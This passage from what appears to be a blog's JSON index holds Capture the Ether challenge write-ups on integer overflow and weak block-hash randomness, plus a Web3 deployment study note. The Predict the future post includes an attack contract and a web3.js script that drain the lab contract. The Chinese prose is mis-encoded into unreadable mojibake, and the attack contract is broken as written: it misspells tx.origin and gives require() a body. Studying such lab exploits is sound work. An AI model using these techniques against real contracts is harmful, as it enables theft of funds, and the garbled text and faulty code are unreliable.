contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether. The contract starts off with a balance of 1 ether. See if you can take some of that away. 1.2 æºç ï¼š 123456789101112131415161718192021222324252627pragma solidity ^0.4.21;contract TokenSaleChallenge &#123; mapping(address =&gt; uint256) public balanceOf; uint256 constant PRICE_PER_TOKEN = 1 ether; function TokenSaleChallenge(address _player) public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance &lt; 1 ether; &#125; function buy(uint256 numTokens) public payable &#123; require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; &#125; function sell(uint256 numTokens) public &#123; require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; msg.sender.transfer(numTokens * PRICE_PER_TOKEN); &#125;&#125; 2. åˆ†æ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼Œå¦‚æœæŒ‰éƒ¨å°±ç­æ¥æ“ä½œï¼ˆå³ ç”¨ç›¸åŒçš„é’±æ¥ä¹°ç›¸åŒçš„ä»£å¸æ˜¯è¡Œä¸é€šçš„â€”-å› ä¸º buy å‡½æ•°ä¸­çš„require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; å’Œ sell å‡½æ•°ä¸­çš„ require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; é™åˆ¶äº†ä½ å­˜å¤šå°‘å–å¤šå°‘ï¼Œä¸èƒ½å­˜å°‘å–å¤šï¼‰ 2.2 æ‰€ä»¥æŒ‰éƒ¨å°±ç­è¡Œä¸é€šï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½å¾€å­˜å°‘å–çš„æ–¹å‘å–è€ƒè™‘ï¼Œè¿™å°±æ¶‰åŠäº†æº¢å‡ºçš„é—®é¢˜ 2.3 ä»¥ uint8ä¸ºä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ åœ¨uint8 çš„åŠ æ³•ä¸­ 123&gt;254 + 1 = 255&gt;254 + 2 = 0&gt;254 + 3 = 1 æˆ‘åœ¨remixä¸­å°è¯•è¿‡ï¼Œç›´æ¥æ˜¾ç¤ºçš„å†™ uint8 = 255 + 1 æ˜¯ä¼šè¢«ç¼–è¯‘å™¨æ£€æµ‹å‡ºæ¥çš„ï¼Œä½†æ˜¯éšå¼çš„å†™åˆ™ä¸ä¼šå³ 12&gt;uint8 a = 255;&gt;uint8 b = a + 1; è¿™æ ·è¾“å‡ºçš„ç»“æœæ˜¯ 0ï¼› åœ¨uint8 çš„ä¹˜æ³•ä¸­ 12&gt;51 * 5 = 255&gt;51 * 6 = 50 51 * 6 = 50 å¯ä»¥æ ¹æ®åŠ æ³•æ‹†åˆ†ä¸º 51 * 6 = 51 * (5 + 1) = 51 * 5 + 51 = 255 + 1 + 50 = 50 æˆ‘çš„ç†è§£æ˜¯è¶…è¿‡ 255é‡æ–°è®¡æ•°ï¼Œå› ä¸ºuint8 çš„å–å€¼èŒƒå›´æ˜¯ [0,255] 256 ä½ï¼Œæ‰€ä»¥è¶…è¿‡255 çš„éƒ¨åˆ†åˆä» 0 å¼€å§‹ã€‚ åŒç† uint256 ç±»å‹ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œuint256çš„å–å€¼èŒƒå›´æ˜¯[0,115792089237316195423570985008687907853269984665640564039457584007913129639935] 2.4 æˆ‘ä»¬æœ¬ç€å­˜å°‘å–å¤šçš„åŸåˆ™ï¼Œè®© require(msg.value == numTokens * PRICE_PER_TOKEN); ä¸­çš„ numTokens * PRICE_PER_TOKEN å‘ç”Ÿæº¢å‡ºï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°èŠ±è´¹å°‘çš„ä¸»å¸è·å–æ›´å¤šçš„ä»£å¸ 2.5 åœ¨åˆçº¦ä¸­ä¸»å¸æ˜¯ä»¥ weiä¸ºå•ä½çš„ ä¹Ÿå°±æ˜¯è¯´ uint256 constant PRICE_PER_TOKEN = 1 ether = 10^18 wei æˆ‘ä»¬å°±éœ€è¦è®¡ç®—å‡ºæº¢å‡ºçš„é—¨æ§›æ˜¯å¤šå°‘ ï¼Œè®¡ç®—å¦‚ä¸‹ï¼š 1234567//115792089237316195423570985008687907853269984665640564039457584007913129639935uint256 result = 2**256 - 1;//115792089237316195423570985008687907853269984665640564039457uint256 temp = result / 10**18;// æ­¤æ—¶ç»™temp çš„å€¼åŠ  1 åº”è¯¥æ˜¯è§¦å‘æº¢å‡ºçš„æœ€ä½é—¨æ§›uint256 money = (temp + 1) * 10**18; //money=415992086870360064 åœ¨remixä¸Šæµ‹è¯•å¾—ï¼š 2.6 ç„¶åå†è°ƒç”¨buyå‡½æ•°çš„æ—¶å€™ï¼Œä»¥ temp+1çš„å€¼ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œmoneyçš„å€¼ä½œä¸ºmsg.value 2.7 ä»¥ 1 ä¸ºå‚æ•°è°ƒç”¨ sellå‡½æ•° è§£é¢˜æˆåŠŸ 3. è§£é¢˜è§£é¢˜è¿‡ç¨‹å¦‚ä¸Šè¿°åˆ†æ","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"web3 å­¦ä¹ æ€»ç»“","slug":"Web3/Basic_Knowledge/web3 å­¦ä¹ æ€»ç»“","date":"2023-04-12T02:47:10.000Z","updated":"2023-04-12T02:47:10.000Z","comments":true,"path":"2023/04/12/Web3/Basic_Knowledge/web3 å­¦ä¹ æ€»ç»“/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Web3/Basic_Knowledge/web3%20%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"web3 å­¦ä¹ æ€»ç»“1. åˆçº¦çš„éƒ¨ç½² â€“ éœ€è¦å‘é€ä¸»å¸ï¼Œä»¥åŠä¼ å…¥å‚æ•°ä»¥ä¸€ä¸ªå†’æ³¡æ’åºåˆçº¦ä¸ºä¾‹ åˆçº¦ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract sort &#123; uint[] arr; constructor(uint[] memory arrays) payable &#123; require(msg.value == 1); arr = arrays; &#125; function bubSort() external returns(uint[] memory) &#123; bool flag; uint temp; for (uint i = 0; i &lt; arr.length - 1; i++) &#123; flag = true; for (uint j = 0; j &lt; arr.length - i - 1; j++) &#123; if(arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125;&#125; 1.1 åœ¨ remix ä¸­å¤åˆ¶åˆçº¦çš„ ABI å’Œ byteCode 1.2 åœ¨ vscode ä¸Šç¼–å†™ä»£ç ï¼Œåˆ›å»º sort.abi å’Œ sort.js æ–‡ä»¶ 1.3 åœ¨ æ ¹æ® è·å–çš„äº¤æ˜“å“ˆå¸Œï¼Œåœ¨ ganache ä¸Šæ‰¾åˆ°ç›¸åº”çš„åˆçº¦åœ°å€ 1.4 åœ¨remix ä¸ŠéªŒè¯éƒ¨ç½²å‡ºæ¥çš„åˆçº¦åœ°å€æ˜¯å¦çœŸå®ï¼Œåˆçº¦ä¸­æ˜¯æœ‰ä¸»å¸çš„ï¼Œæ‰€ä»¥æ˜¯æ­£ç¡®çš„ éƒ¨ç½²åˆçº¦çš„ä»£ç ï¼š 12345678910111213141516171819202122let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);var byteCode = &quot;0x60806040526040516106f33803806106f38339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b61043f806102b46000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063283fdc7814610030575b600080fd5b61003861004e565b60405161004591906102d9565b60405180910390f35b606060008060005b6001600080549050610068919061032a565b8110156101b8576001925060005b600182600080549050610089919061032a565b610093919061032a565b81101561019f5760006001826100a9919061035e565b815481106100ba576100b9610392565b5b9060005260206000200154600082815481106100d9576100d8610392565b5b9060005260206000200154111561018c57600081815481106100fe576100fd610392565b5b90600052602060002001549250600060018261011a919061035e565b8154811061012b5761012a610392565b5b90600052602060002001546000828154811061014a57610149610392565b5b9060005260206000200181905550826000600183610168919061035e565b8154811061017957610178610392565b5b9060005260206000200181905550600093505b8080610197906103c1565b915050610076565b50826101b85780806101b0906103c1565b915050610056565b50600080548060200260200160405190810160405280929190818152602001828054801561020557602002820191906000526020600020905b8154815260200190600101908083116101f1575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b6102508161023d565b82525050565b60006102628383610247565b60208301905092915050565b6000602082019050919050565b600061028682610211565b610290818561021c565b935061029b8361022d565b8060005b838110156102cc5781516102b38882610256565b97506102be8361026e565b92505060018101905061029f565b5085935050505092915050565b600060208201905081810360008301526102f3818461027b565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006103358261023d565b91506103408361023d565b9250828203905081811115610358576103576102fb565b5b92915050565b60006103698261023d565b91506103748361023d565b925082820190508082111561038c5761038b6102fb565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103cc8261023d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103fe576103fd6102fb565b5b60018201905091905056fea264697066735822122040692a2976cbd61653fb0d4195fa70c62b232f3d9b74fdf1f80f9e5bbada103c64736f6c63430008130033&quot;;// éƒ¨ç½²åˆçº¦çš„ä»£ç contract.deploy(&#123; data: byteCode, arguments: [[5,4,3,2,1]]&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 4700000, value: 1&#125;,function(err,result)&#123; console.log(&quot;åˆçº¦éƒ¨ç½²å¾—åˆ°çš„äº¤æ˜“å“ˆå¸Œä¸ºï¼š&quot;); console.log(result);&#125;) 2.1 è°ƒç”¨åˆçº¦çš„å‡½æ•°ï¼Œpayableå‡½æ•° 2.1 è°ƒç”¨ bubSortå‡½æ•°ï¼Œå¯¹æ•°ç»„è¿›è¡Œæ’åº 123456789101112// è°ƒç”¨åˆçº¦å‡½æ•°var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;) æ‰§è¡Œç»“æœï¼š 2.2 æ‰§è¡Œä¹‹åè·å¾—äº¤æ˜“çš„å“ˆå¸Œï¼Œå¹¶åœ¨ganacheä¸ŠæŸ¥çœ‹ 2.3 å°†äº¤æ˜“å“ˆå¸Œé€šè¿‡ remix ä¸Šçš„debug æ¥æŸ¥çœ‹åˆçº¦ä¸­çš„å˜é‡ æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œä¼ å…¥çš„æ•°ç»„ä¸º[5,4,3,2,1] è°ƒç”¨æ’åºå‡½æ•°ä¹‹åï¼Œæ•°ç»„å˜æˆäº†[1,2,3,4,5] è¯´æ˜æ‰§è¡ŒæˆåŠŸ 2.4 å®Œæ•´çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);// var byteCode = &quot;60806040526040516106e63803806106e68339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b610432806102b46000396000f3fe60806040526004361061001e5760003560e01c8063283fdc7814610023575b600080fd5b61002b610041565b60405161003891906102cc565b60405180910390f35b606060008060005b600160008054905061005b919061031d565b8110156101ab576001925060005b60018260008054905061007c919061031d565b610086919061031d565b81101561019257600060018261009c9190610351565b815481106100ad576100ac610385565b5b9060005260206000200154600082815481106100cc576100cb610385565b5b9060005260206000200154111561017f57600081815481106100f1576100f0610385565b5b90600052602060002001549250600060018261010d9190610351565b8154811061011e5761011d610385565b5b90600052602060002001546000828154811061013d5761013c610385565b5b906000526020600020018190555082600060018361015b9190610351565b8154811061016c5761016b610385565b5b9060005260206000200181905550600093505b808061018a906103b4565b915050610069565b50826101ab5780806101a3906103b4565b915050610049565b5060008054806020026020016040519081016040528092919081815260200182805480156101f857602002820191906000526020600020905b8154815260200190600101908083116101e4575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b61024381610230565b82525050565b6000610255838361023a565b60208301905092915050565b6000602082019050919050565b600061027982610204565b610283818561020f565b935061028e83610220565b8060005b838110156102bf5781516102a68882610249565b97506102b183610261565b925050600181019050610292565b5085935050505092915050565b600060208201905081810360008301526102e6818461026e565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061032882610230565b915061033383610230565b925082820390508181111561034b5761034a6102ee565b5b92915050565b600061035c82610230565b915061036783610230565b925082820190508082111561037f5761037e6102ee565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103bf82610230565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103f1576103f06102ee565b5b60018201905091905056fea2646970667358221220ae8c4b8dcba12a3c05b294a45463cdbfcc21cbcdcfe3c2160fd3b8e26fa8304a64736f6c63430008130033&quot;;// éƒ¨ç½²åˆçº¦çš„ä»£ç // contract.deploy(&#123;// data: byteCode,// arguments: [[5,4,3,2,1]]// &#125;).send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// gas: 4700000,// value: 1// &#125;,function(err,result)&#123;// console.log(&quot;åˆçº¦éƒ¨ç½²å¾—åˆ°çš„äº¤æ˜“å“ˆå¸Œä¸ºï¼š&quot;);// console.log(result);// &#125;)// è°ƒç”¨åˆçº¦å‡½æ•°var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;)// var answer;// web.eth.getStorageAt(address,0,(err,result)=&gt;&#123;// answer = web.utils.hexToNumber(result);// console.log(answer);// &#125;) tips:å¦‚æœå‡½æ•°éœ€è¦ä¼ å‚ï¼Œç›´æ¥åœ¨è°ƒç”¨å‡½æ•°çš„æ—¶å€™ä¼ å…¥å°±å¯ä»¥äº†ï¼Œå¦‚ä¸‹ï¼š","categories":[{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"}],"tags":[{"name":"å­¦ä¹ æ€»ç»“","slug":"å­¦ä¹ æ€»ç»“","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"}]},{"title":"Predict the block hash","slug":"Smart contracts/capther the ether/Predict the block hash","date":"2023-04-10T06:01:10.000Z","updated":"2023-04-10T06:01:10.000Z","comments":true,"path":"2023/04/10/Smart contracts/capther the ether/Predict the block hash/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/Smart%20contracts/capther%20the%20ether/Predict%20the%20block%20hash/","excerpt":"","text":"Predict the block hash1. é¢˜ç›® 1.1 é¢˜ç›®ï¼š Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block 1.2 æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123; address guesser; bytes32 guess; uint256 settlementBlockNumber; function PredictTheBlockHashChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(bytes32 hash) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = hash; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); bytes32 answer = block.blockhash(settlementBlockNumber); guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼Œè¯¥é¢˜å’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œè¿™é¢˜è¦çŒœæµ‹çš„æ•°æ˜¯ 256ä½çš„ï¼Œå³byte32ç±»å‹ 2.2 è¿™é¢˜æ˜¯éœ€è¦é¢„æµ‹ä¸‹ä¸€ä¸ªå—å“ˆå¸Œçš„å—å·ï¼Œæ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†æ˜¯ å®˜æ–¹æ–‡æ¡£å¯¹ block.blockhash æ˜¯è¿™æ ·å®šä¹‰å’Œè§£é‡Šçš„ å…·ä½“æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œæˆ‘å»ç½‘ä¸Šæœçš„è§£é‡Šæ˜¯ï¼Œä»–åªèƒ½å¾—åˆ°256ä¸ªåŒºå—å†…çš„å“ˆå¸Œå€¼ï¼Œä¸€æ—¦è¶…è¿‡256çš„åŒºå—ï¼Œå°±æ— æ³•è¿”å›å¯¹åº”çš„åŒºå—å“ˆå¸Œï¼Œåªä¼šè¿”å›é›¶â€”-æˆ‘çš„ç†è§£æ˜¯ï¼šå¦‚æœé¢˜ç›®ä¸­çš„ answer æ˜¯åœ¨ block.number &#x3D; 0 æ—¶è®¾ç½®çš„ï¼Œå½“æ­¤æ—¶çš„block.number &gt;&#x3D; 256æ—¶ï¼Œå†å»è®¡ç®— block.blockhash(settlementBlockNumber) è¿™ä¸ªå€¼å°±æ˜¯ block.blockhash(0) çš„å€¼äº†ï¼ˆsettlementBlockNumber &#x3D; block.number + 1ï¼‰ 2.3 è§£é¢˜æ€è·¯å°±æ˜¯ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ lockInGuess() å‡½æ•°ï¼Œä»¥ 0 çš„hash ä½œä¸ºå‚æ•°ä¼ å…¥è¯¥å‡½æ•°ä¸­ï¼Œè¿‡ä¸€æ®µæ—¶é—´åï¼Œå†è°ƒç”¨ settle() å‡½æ•°ï¼Œå…·ä½“ç­‰å¤šä¹…æˆ‘ä¹Ÿä¸çŸ¥é“ 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Predict the future","slug":"Smart contracts/capther the ether/Predict the future","date":"2023-04-10T04:01:10.000Z","updated":"2023-04-10T04:01:10.000Z","comments":true,"path":"2023/04/10/Smart contracts/capther the ether/Predict the future/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/10/Smart%20contracts/capther%20the%20ether/Predict%20the%20future/","excerpt":"","text":"Predict the future1. é¢˜ç›® 1.1 This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers. Note that it is indeed possible to solve this challenge without losing any ether. 1.2 æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123; address guesser; uint8 guess; uint256 settlementBlockNumber; function PredictTheFutureChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; guesser = 0; if (guess == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 è¯¥é¢˜éœ€è¦æå‰é”å®šç­”æ¡ˆï¼Œå†éªŒè¯ç­”æ¡ˆï¼ˆå³ï¼Œå…ˆè°ƒç”¨ lockInGuess å‡½æ•°å†è°ƒç”¨ settle å‡½æ•°ï¼‰ï¼›å¾ˆæ˜¾ç„¶è¿™æ ·æ˜¯çŒœä¸å‡ºæ¥çš„ï¼Œä½†æ˜¯ç”± uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; å¯çŸ¥ï¼Œanswer çš„å€¼åªç”¨åä¸ªå¯èƒ½ï¼Œå³ [0,9] 2.2 æˆ‘ä»¬å¯ä»¥å…ˆç¡®å®šæˆ‘ä»¬è‡ªå·±è®¾å®šçš„ answer ï¼Œæ”¹å˜é¢˜ç›®è¦æ±‚ä¸­çš„ answer ï¼Œé€šè¿‡ä¸æ–­æ”¹å˜ block.number å’Œ æ—¶é—´æˆ³æ¥æ”¹å˜é¢˜ç›®ä¸­çš„ answer ï¼ˆè°ƒç”¨å…¶ä»–åˆçº¦æ—¶ï¼Œæ˜¯åœ¨åŒä¸€å—åŒºå—ä¸­è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯ä¸ºæˆ‘ä»¬ç¡®å®šå”¯ä¸€çš„ block.number å’Œ æ—¶é—´æˆ³ï¼‰ 2.3 ç¼–å†™ä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œ 123456789101112131415161718192021222324contract attack&#123; PredictTheFutureChallenge pre; uint8 public answer=5; function attack(address _addr)public&#123; pre = PredictTheFutureChallenge(_addr); &#125; function lock()public payable&#123; pre.lockInGuess.value(1 ether)(answer); &#125; function att()public&#123; uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10; if(temp == answer)&#123; pre.settle(); &#125; require(pre.isComplete())&#123; tx.orgin.transfer(address(this).balance); &#125; &#125; function()external payable&#123; &#125;&#125; 2.4 å…ˆé”å®šæˆ‘ä»¬çš„ç­”æ¡ˆï¼ˆè°ƒç”¨lock() å‡½æ•°ï¼‰ï¼Œä¸åœçš„è°ƒç”¨att() å‡½æ•°ï¼Œç›´åˆ° PredictTheFutureChallenge åˆçº¦ä¸­çš„ isComplete å‡½æ•°çš„å€¼è¿”å›çš„æ˜¯ true æˆ– åˆçº¦çš„ä½™é¢ä¸º 0 3. è§£é¢˜ 3.1 ä½¿ç”¨ Web3è§£é¢˜ï¼ˆå› ä¸ºremixçš„bugå®åœ¨æ˜¯å¤ªå¤šäº†ï¼‰ï¼Œå…ˆåœ¨ remixéƒ¨ç½²åˆçº¦ï¼Œè·å–ç›¸å¯¹åº”çš„åˆçº¦åœ°å€ tipsï¼šéƒ¨ç½²ä¸€ä¸ª attack åˆçº¦ä¹‹åï¼Œå¦‚æœæ‰§è¡Œäº†lock å‡½æ•°å°±ä¸èƒ½åœ¨ä¸é‡æ–°éƒ¨ç½² PredictTheFutureChallengeåˆçº¦çš„åŸºç¡€ä¸Šä½¿ç”¨æ–°åˆçº¦è°ƒç”¨lockå‡½æ•°ï¼Œå› ä¸ºguesserå·²ç»è¢«èµ‹å€¼äº†ï¼Œç¨åçš„require å°†ä¸èƒ½é€šè¿‡ 3.2 åœ¨æˆ‘çš„ vscodeä¸Šé¢ç–¯ç‹‚æ‰§è¡Œ att å‡½æ•°ï¼Œç›´åˆ°remixä¸Š isCompleteè¿”å›çš„å€¼å‘ç”Ÿæ”¹å˜ï¼Œåˆçº¦çš„é‡‘é¢è½¬ç§»ä¸ºæ­¢ï¼Œå¦‚å›¾ï¼š 3.3 åœ¨ vscode ä¸Šçš„ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var contractABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\é¶åœº\\\\capturetheether\\\\abi\\\\PredictTheFutureChallengeHack.abi&quot;),toString());// var contractADD = &quot;0x80F5D36E412076Dd758961d729D8F84dc6c34A46&quot;;var contractADD = &quot;0xD52d9e548C6d18445a465dd08b5b2B47ca449Ee9&quot;; // Hack_Addressvar contract = new web.eth.Contract(contractABI,contractADD);// console.log(contract);var balance = web.eth.getBalance(contractADD,function(err,result)&#123;console.log(result);&#125;);// console.log(balance);// 00000000000000000000000580f5d36e412076dd758961d729d8f84dc6c34a46var answer;web.eth.getStorageAt(contractADD,0,(err,result)=&gt;&#123; // answer = web.utils.hexToNumber(result); console.log(&quot;è¿™ä¸ªæ˜¯ç»“æœï¼š&quot; + result);&#125;)// contract.methods.lock().send(&#123;// from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;,// value: 1000000000000000000// &#125;).on(&quot;receipt&quot;,function(result)&#123;// console.log(result);// &#125;)contract.methods.att().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, // value: 1000000000000000000&#125;).on(&quot;receipt&quot;,function(result)&#123; console.log(result);&#125;)","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the new number","slug":"Smart contracts/capther the ether/Guess the new number","date":"2023-04-07T01:47:10.000Z","updated":"2023-04-07T01:47:10.000Z","comments":true,"path":"2023/04/07/Smart contracts/capther the ether/Guess the new number/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/07/Smart%20contracts/capther%20the%20ether/Guess%20the%20new%20number/","excerpt":"","text":"Guess the new number1. é¢˜ç›® 1.1 è¦æ±‚ï¼š The number is now generated on-demand when a guess is made 1.2 é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920pragma solidity ^0.4.21;contract 